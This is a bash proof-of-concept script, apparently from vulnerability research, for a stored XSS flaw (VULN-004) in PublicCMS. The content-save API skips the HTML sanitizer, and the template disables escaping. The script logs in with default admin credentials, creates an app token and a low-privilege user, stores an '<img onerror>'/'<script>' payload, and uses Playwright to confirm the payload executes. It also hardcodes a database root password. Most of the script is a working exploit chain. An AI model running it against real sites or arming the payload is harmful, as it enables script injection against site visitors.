#!/usr/bin/env bash
# VULN-004 — Stored XSS: rich-text sanitizer skipped on web/API content-save (base64 gate)
#
# The rich-text sanitizer (cleanUnsafeHtml) is gated on a `base64` boolean. The admin save channel
# passes base64=true (sanitized); the web (ContentController) and API (ContentCreateDirective) save
# channels pass base64=false, so user HTML is stored VERBATIM in cms_content_attribute.text. The
# deployed content template renders the body with `${(arrtibute.text?no_esc)!}` (content.html:46),
# i.e. auto-escaping is explicitly disabled — so the raw HTML executes when the page is viewed.
#
# This script stores an XSS payload through the API save channel, confirms it is emitted UNESCAPED
# into the rendered page, and then loads that page in a REAL browser (Playwright) to confirm the
# payload EXECUTES (window markers set by the injected <img onerror> and <script>).
#
# CONFIRMED when the browser reports the injected JS executed.
#
# DESTRUCTIVE (creates content). App/token/user/content created per run (random suffix).
set -u
BASE_URL="${BASE_URL:-http://localhost:20000}"
VHOST="${VHOST:-site2.dev.publiccms.com}"
ADMIN_USER="${ADMIN_USER:-admin}"; ADMIN_PASS="${ADMIN_PASS:-admin}"
CATEGORY_ID="${CATEGORY_ID:-14}"; MODEL_ID="${MODEL_ID:-article}"
PW_IMAGE="${PW_IMAGE:-mcr.microsoft.com/playwright:latest}"; PW_VER="${PW_VER:-1.46.1}"
MYSQL_CONTAINER="${MYSQL_CONTAINER:-cvehunt_PublicCMS_mysql}"
DBQ(){ docker exec "$MYSQL_CONTAINER" mysql -uroot -pRootPass2026 publiccms -N -e "$1" 2>/dev/null | tr -d '\r'; }
OUT="$(cd "$(dirname "$0")" && pwd)"; S="$(tr -dc 'a-z0-9' </dev/urandom | head -c 8)"

echo "[INFO] VULN-004: stored XSS via unsanitized web/API content-save (base64 gate) + ?no_esc template"

AC=$(curl -s -D - -o /dev/null -H "Host: $VHOST" --data "username=${ADMIN_USER}&password=${ADMIN_PASS}" \
     "$BASE_URL/admin/login" | grep -i 'set-cookie: PUBLICCMS_ADMIN' | cut -d= -f2 | cut -d';' -f1); ACSRF="${AC#*_}"
[ -z "$AC" ] && { echo "[FAIL] no admin session"; exit 1; }

echo "[SETUP] provision app(contentCreate)+token, and a low-priv contributor"
curl -s -o /dev/null -H "Host: $VHOST" -b "PUBLICCMS_ADMIN=$AC" --data-urlencode "_csrf=$ACSRF" \
  --data-urlencode "name=xss_$S" --data-urlencode "channel=web" --data-urlencode "appKey=xk_$S" \
  --data-urlencode "appSecret=xs_$S" --data-urlencode "apis=contentCreate" "$BASE_URL/admin/sysApp/save"
APPID=$(DBQ "SELECT id FROM sys_app WHERE app_key='xk_$S';")
curl -s -o /dev/null -H "Host: $VHOST" -b "PUBLICCMS_ADMIN=$AC" --data-urlencode "_csrf=$ACSRF" --data-urlencode "id=$APPID" "$BASE_URL/admin/sysAppToken/issue"
APPTOKEN=$(DBQ "SELECT auth_token FROM sys_app_token WHERE app_id=$APPID ORDER BY create_date DESC LIMIT 1;")
curl -s -o /dev/null -H "Host: $VHOST" -b "PUBLICCMS_ADMIN=$AC" --data-urlencode "_csrf=$ACSRF" \
  --data-urlencode "name=contrib_$S" --data-urlencode "nickname=contrib_$S" --data-urlencode "password=Passw0rd!23" \
  --data-urlencode "repassword=Passw0rd!23" --data-urlencode "contentPermissions=0" "$BASE_URL/admin/sysUser/save"
CUID=$(DBQ "SELECT id FROM sys_user WHERE name='contrib_$S';")
SHA=$(python3 -c "import hashlib;print(hashlib.sha512(b'Passw0rd!23').hexdigest())")
UTOK=$(curl -s -H "Host: $VHOST" "$BASE_URL/api/login?username=contrib_$S&password=$SHA&encoding=sha512&channel=web" | python3 -c "import sys,json;print(json.load(sys.stdin).get('authToken',''))")
[ -z "$APPTOKEN" ] || [ -z "$UTOK" ] && { echo "[FAIL] token provisioning failed"; exit 1; }

PAYLOAD="<img src=x onerror=window.__xss_${S}=1> <script>window.__xss2_${S}=1</script>"
echo "[STEP] store payload via API /api/contentCreate (base64=false -> NOT sanitized)"
curl -s -G -H "Host: $VHOST" -H "appToken: $APPTOKEN" -H "authToken: $UTOK" -H "authUserId: $CUID" \
  --data-urlencode "categoryId=$CATEGORY_ID" --data-urlencode "modelId=$MODEL_ID" \
  --data-urlencode "title=XSSPOC_$S" --data-urlencode "text=$PAYLOAD" "$BASE_URL/api/contentCreate" > "$OUT/response.txt"
CID=$(DBQ "SELECT id FROM cms_content WHERE title='XSSPOC_$S';")
[ -z "$CID" ] && { echo "[FAIL] content not created"; exit 1; }
STORED=$(DBQ "SELECT text FROM cms_content_attribute WHERE content_id=$CID;")
echo "[INFO] stored body: $STORED"
echo "$STORED" > "$OUT/evidence/stored_text.txt"

echo "[STEP] confirm payload is emitted UNESCAPED in the rendered page (content/$CID)"
curl -s -H "Host: $VHOST" "$BASE_URL/content/$CID" -o "$OUT/evidence/rendered_page.html"
if grep -qF "onerror=window.__xss_${S}=1" "$OUT/evidence/rendered_page.html" && grep -qF "<script>window.__xss2_${S}=1</script>" "$OUT/evidence/rendered_page.html"; then
  echo "[INFO] payload present RAW/unescaped in HTML (not entity-encoded) — stored-XSS sink reached"
else
  echo "[FAIL] payload not found raw in rendered page (may be escaped)"; exit 1
fi

echo "[STEP] confirm EXECUTION in a real browser (Playwright)"
PORT="${BASE_URL##*:}"
BROWSER_OUT=$(timeout 420 docker run --rm --network host --ipc=host --memory=2g \
  --add-host "${VHOST}:127.0.0.1" \
  -e TARGET_URL="http://${VHOST}:${PORT}/content/$CID" -e MARKER="$S" -e HOME=/tmp -e PLAYWRIGHT_SKIP_BROWSER_DOWNLOAD=1 \
  -v "$(dirname "$(dirname "$OUT")"):/work" -w /tmp \
  "$PW_IMAGE" sh -c "npm i playwright@${PW_VER} --no-save --prefix /tmp/pw >/tmp/npm.log 2>&1 || { echo NPM_FAIL; tail -3 /tmp/npm.log; exit 9; }; NODE_PATH=/tmp/pw/node_modules node /work/exploits/VULN-004/xss_check.js" 2>&1)
echo "$BROWSER_OUT" | tail -6
echo "$BROWSER_OUT" > "$OUT/evidence/browser_run.log"

if printf '%s' "$BROWSER_OUT" | grep -q '\[OK\] stored XSS EXECUTED'; then
  echo "[OK] exploit confirmed — low-priv-authored stored XSS executed in a real browser"
  exit 0
else
  echo "[FAIL] payload stored raw but browser execution not confirmed (see evidence/browser_run.log)"; exit 1
fi
# cleanup hint: DELETE FROM cms_content WHERE title LIKE 'XSSPOC_%'; plus sys_app/sys_app_token/sys_user for this suffix.
